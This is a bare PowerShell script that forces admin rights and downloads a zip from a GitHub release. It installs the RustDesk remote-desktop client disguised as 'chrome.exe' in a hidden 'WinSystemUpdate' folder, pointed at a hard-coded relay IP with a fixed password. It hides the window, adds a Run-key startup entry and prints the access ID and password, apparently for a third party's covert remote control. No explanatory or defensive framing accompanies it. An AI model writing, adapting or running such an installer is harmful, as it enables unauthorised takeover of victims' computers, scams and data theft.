# Request admin if not already
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command &{$($MyInvocation.MyCommand.Definition)}" -Verb RunAs
    exit
}

$DEST="$env:LOCALAPPDATA\WinSystemUpdate"
$EXE="$DEST\chrome.exe"
$DLL="$DEST\sciter.dll"
$ZIP="$env:TEMP\update.zip"

Get-Process chrome -EA 0|Stop-Process -Force -EA 0
rm $DEST -Recurse -Force -EA 0
mkdir $DEST,$env:APPDATA\RustDesk\config -EA 0|Out-Null

Write-Host "Installing..." -ForegroundColor Cyan
(New-Object Net.WebClient).DownloadFile('https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip',$ZIP)

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($ZIP,$DEST)
rm $ZIP

@'
rendezvous_server='34.107.221.82'
relay_server='34.107.221.82'
[options]
verification-method='use-permanent-password'
approve-mode='password-click'
force-always-relay='Y'
'@|Set-Content "$env:APPDATA\RustDesk\config\RustDesk2.toml"

@'
password='Remote123'
key_confirmed=true
'@|Set-Content "$env:APPDATA\RustDesk\config\RustDesk.toml"

(Get-Item $DEST -Force).Attributes+=2

$p=New-Object Diagnostics.ProcessStartInfo
$p.FileName=$EXE
$p.Arguments='--get-id'
$p.UseShellExecute=$false
$p.RedirectStandardOutput=$true
$p.CreateNoWindow=$true
$p.WorkingDirectory=$DEST
$pr=[Diagnostics.Process]::Start($p)
$id=$pr.StandardOutput.ReadToEndAsync().Result.Trim()
$pr.WaitForExit(8000)|Out-Null

$p.Arguments=''
[Diagnostics.Process]::Start($p)|Out-Null
Start-Sleep 2

Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);' -EA 0
Get-Process chrome -EA 0|%{[N.W]::ShowWindow($_.MainWindowHandle,0)|Out-Null}

sp HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run WinSystemUpdate $EXE -Force

@"
`$d='$DEST'
Get-Process chrome -EA 0|Stop-Process -Force -EA 0
rp HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run WinSystemUpdate -EA 0
rm -LiteralPath `$d -Recurse -Force -EA 0
"@|Set-Content "$DEST\delete.ps1"

@"
`$e='$EXE'
`$d='$DEST\delete.ps1'
`$t=[DateTime]::Now.AddHours(1)
while([DateTime]::Now-lt`$t){
  Start-Sleep 10
  if(-not(Get-Process chrome -EA 0)){break}
}
if(Test-Path `$d){&`$d}
"@|Set-Content "$DEST\watch.ps1"

Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$DEST\watch.ps1`""

Write-Host ""
Write-Host "  ============================" -ForegroundColor Green
Write-Host "  ID       : $id" -ForegroundColor Cyan
Write-Host "  Password : Remote123" -ForegroundColor Cyan
Write-Host "  ============================" -ForegroundColor Green
Write-Host ""
